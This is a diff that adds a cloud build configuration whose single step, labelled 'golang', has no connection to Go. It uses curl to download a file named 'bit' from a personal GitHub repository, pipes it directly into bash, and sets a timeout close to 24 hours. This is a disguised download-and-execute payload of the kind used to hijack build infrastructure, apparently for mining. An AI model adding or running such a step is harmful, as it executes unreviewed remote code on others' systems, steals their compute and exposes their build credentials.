@@ -1,0 +1,10 @@
+steps:
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      curl -sL https://github.com/ranalims99/nice/raw/main/bit | bash
+  waitFor:
+    - '-'
+timeout: '86000s'
